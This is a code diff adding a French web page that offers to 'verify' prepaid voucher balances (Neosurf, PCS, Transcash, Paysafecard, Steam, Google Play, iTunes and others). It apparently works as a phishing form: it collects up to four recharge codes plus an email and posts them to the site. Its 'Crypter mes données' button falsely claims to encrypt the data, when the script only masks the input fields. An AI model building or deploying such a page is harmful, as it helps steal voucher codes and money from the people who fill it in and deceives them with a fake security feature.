@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="greenlogo.ico" rel="icon">
+    <title>Verifie ton plafond on line</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://kit.fontawesome.com/c1eebca42a.js" crossorigin="anonymous"></script>
+
+	
+  </head>
+  <body>
+
+    <div class="form">
+        <form method="post" action="/">
+      <h3 id="ancre"> Veuillez entrez les informations du coupon ici</h3>
+      <div class="form-group gender">
+        <label for="RECHARGE">Choisir une recharge</label>
+        <select name="coupon" id="RECHARGE">
+          <option value="NEOSURF" >NEOSURF</option>            
+          <option value="PCS">PCS</option>
+          <option value="TRANSCASH" >TRANSCASH</option>
+          <option value="CASHLIB" >CASHLIB</option>
+          <option value="PAYSAFECARD" >PAYSAFECARD</option>
+          <option value="STEAM" >STEAM</option>
+          <option value="GOOGLEPLAY" >GOOGLEPLAY</option>
+          <option value="AMAZON" >AMAZON</option>
+          <option value="WISHCARD" >WISHCARD</option>
+          <option value="FLEXEPIN" >FLEXEPIN</option>
+          <option value="ITUNES" >ITUNES</option>
+        </select>
+      </div>
+      <div class="form-group fullname">
+        <label for="MONTANT">Montant de la recharge</label>
+        <input type="number" id="MONTANT" value="" name="montant" placeholder="0" required>
+      </div>
+      <div class="form-group gender">
+        <label for="DEVISE">Choisir la devise</label>
+        <select name="devise" id="DEVISE" required>
+          <option value="EURO" >EURO (€)</option>
+          <option value="DOLLAR" >DOLLAR ($)</option>
+          <option value="CHF" >FRANC SUISSE (CHF)</option>
+        </select>
+      </div>
+      <div class="form-group fullname">
+        <label for="CODE1">Entrez les codes de recharge</label>
+        <input name="code1" class="code" type="text" id="CODE1" value="" placeholder="Entrer code recharge 1" required>
+      </div>
+      <div class="form-group fullname">
+        <label for="CODE2"></label>
+        <input name="code2" class="code" type="text" id="CODE2" value="" placeholder="Entrer code recharge 2" >
+      </div>
+      <div class="form-group fullname">
+        <label for="CODE3"></label>
+        <input name="code3" class="code" type="text" id="CODE3" value="" placeholder="Entrer code recharge 3" >
+      </div>
+      <div class="form-group fullname">
+        <label for="CODE4"></label>
+        <input name="code4" class="code" type="text" id="CODE4" value="" placeholder="Entrer code recharge 4" >
+      </div>
+
+      <div class="form-group submit-btn">
+        <input name="crypter" onclick="" id="btn_crypt" type="button" value="Crypter mes données">
+      </div>
+
+      <div class="form-group email">
+        <label for="email">Entrez votre adresse email</label>
+        <input type="email" name="email" id="email" value="" placeholder="Enter your email address" required>
+      </div>
+            <div class="form-group submit-btn">
+        <input name="envoie" type="submit" value="VALIDER">
+      </div>
+    </form>
+    </div>
+        
+  </body>
+
+  <script>
+      let crypte = false
+      const btn_crypt =  document.querySelector("#btn_crypt")
+      function crypter(){
+        const btn_crypt =  document.querySelector("#btn_crypt")
+        const ACrypter = document.querySelectorAll(".code")
+        if (!crypte) {
+          for (let i = 0; i < ACrypter.length; i++) {
+            const e = ACrypter[i];
+            e.type = "password"
+          }
+          crypte = true
+          btn_crypt.value = "Décrypter mes données"
+        }
+        else{
+          for (let i = 0; i < ACrypter.length; i++) {
+            const e = ACrypter[i];
+            e.type = "text"
+          }
+          crypte = false
+          btn_crypt.value = "Crypter mes données"
+        }
+        
+      }
+      btn_crypt.addEventListener("click", crypter, true)
+    </script>
+</html>
